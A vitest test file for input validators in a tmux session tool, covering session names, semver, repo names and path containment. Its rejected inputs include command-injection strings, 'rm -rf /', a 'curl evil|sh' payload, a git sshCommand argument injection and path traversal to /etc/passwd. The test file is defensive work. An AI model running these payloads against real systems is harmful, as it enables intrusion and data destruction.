import { describe, it, expect } from 'vitest';
import os from 'os';
import path from 'path';
import {
  isValidSessionName,
  sanitizeSessionNamePart,
  clampHistoryLines,
  isValidSemver,
  isValidRepoName,
  resolveInsideBase,
  expandHome,
  MAX_HISTORY_LINES,
} from '../../src/lib/validation.js';

describe('isValidSessionName', () => {
  it('accepts names produced by the dashboard and the agent', () => {
    expect(isValidSessionName('my-project--fair-fox-44')).toBe(true);
    expect(isValidSessionName('--fair-fox-44')).toBe(true);
    expect(isValidSessionName('root--lx3k2a0')).toBe(true);
  });

  it.each([
    ['shell metacharacters', 'x";id;"'],
    ['command substitution', 'a$(id)'],
    ['backticks', 'a`id`'],
    ['newline', 'a\nb'],
    ['path traversal', '../../etc/passwd'],
    ['slash', 'a/b'],
    ['space', 'a b'],
    ['tmux target separators', 'a:b.c'],
    ['empty string', ''],
  ])('rejects %s', (_label, value) => {
    expect(isValidSessionName(value)).toBe(false);
  });

  it('rejects names longer than 100 characters and non-strings', () => {
    expect(isValidSessionName('a'.repeat(100))).toBe(true);
    expect(isValidSessionName('a'.repeat(101))).toBe(false);
    expect(isValidSessionName(undefined)).toBe(false);
    expect(isValidSessionName(42)).toBe(false);
  });
});

describe('sanitizeSessionNamePart', () => {
  it('replaces characters tmux or the shell would treat specially', () => {
    expect(sanitizeSessionNamePart('my.app')).toBe('my_app');
    expect(sanitizeSessionNamePart('My Project')).toBe('My_Project');
    expect(sanitizeSessionNamePart('a/b:c')).toBe('a_b_c');
  });

  it('keeps already-safe names untouched', () => {
    expect(sanitizeSessionNamePart('my-project_2')).toBe('my-project_2');
  });
});

describe('clampHistoryLines', () => {
  it('returns the fallback for anything that is not a positive integer', () => {
    expect(clampHistoryLines('5; rm -rf /', 1000)).toBe(1000);
    expect(clampHistoryLines(undefined, 1000)).toBe(1000);
    expect(clampHistoryLines(-5, 1000)).toBe(1000);
    expect(clampHistoryLines(0, 1000)).toBe(1000);
    expect(clampHistoryLines(1.5, 1000)).toBe(1000);
    expect(clampHistoryLines(NaN, 1000)).toBe(1000);
  });

  it('accepts integers and numeric strings, capped at the maximum', () => {
    expect(clampHistoryLines(250, 1000)).toBe(250);
    expect(clampHistoryLines('250', 1000)).toBe(250);
    expect(clampHistoryLines(10_000_000, 1000)).toBe(MAX_HISTORY_LINES);
  });
});

describe('isValidSemver', () => {
  it('accepts plain major.minor.patch', () => {
    expect(isValidSemver('2.44.2')).toBe(true);
    expect(isValidSemver('0.0.1')).toBe(true);
  });

  it.each(['99.0.0;curl evil|sh', '1.2.3\nrm -rf /', '1.2', 'v1.2.3', '1.2.3-beta', '', ' 1.2.3'])(
    'rejects %j',
    (value) => {
      expect(isValidSemver(value)).toBe(false);
    }
  );
});

describe('isValidRepoName', () => {
  it('accepts ordinary repository names', () => {
    expect(isValidRepoName('247-claude-code-remote')).toBe(true);
    expect(isValidRepoName('next.js')).toBe(true);
    expect(isValidRepoName('repo_1')).toBe(true);
  });

  it.each(['--config=core.sshCommand=touch pwned', '-x', '..', '.', '.git', 'a/b', '../evil', ''])(
    'rejects %j',
    (value) => {
      expect(isValidRepoName(value)).toBe(false);
    }
  );
});

describe('resolveInsideBase', () => {
  const base = path.join(os.tmpdir(), 'projects');

  it('resolves a direct child of the base path', () => {
    expect(resolveInsideBase(base, 'my-app')).toBe(path.join(base, 'my-app'));
  });

  it.each(['..', '../..', '../other', 'a/../../b', '/etc', ''])('returns null for %j', (child) => {
    expect(resolveInsideBase(base, child)).toBeNull();
  });

  it('does not treat a sibling with the same prefix as inside', () => {
    expect(resolveInsideBase(base, '../projects-evil')).toBeNull();
  });
});

describe('expandHome', () => {
  it('expands a leading tilde to the home directory', () => {
    expect(expandHome('~/Dev')).toBe(path.join(os.homedir(), 'Dev'));
    expect(expandHome('~')).toBe(os.homedir());
  });

  it('leaves other paths unchanged', () => {
    expect(expandHome('/srv/projects')).toBe('/srv/projects');
    expect(expandHome('/srv/~backup')).toBe('/srv/~backup');
  });
});
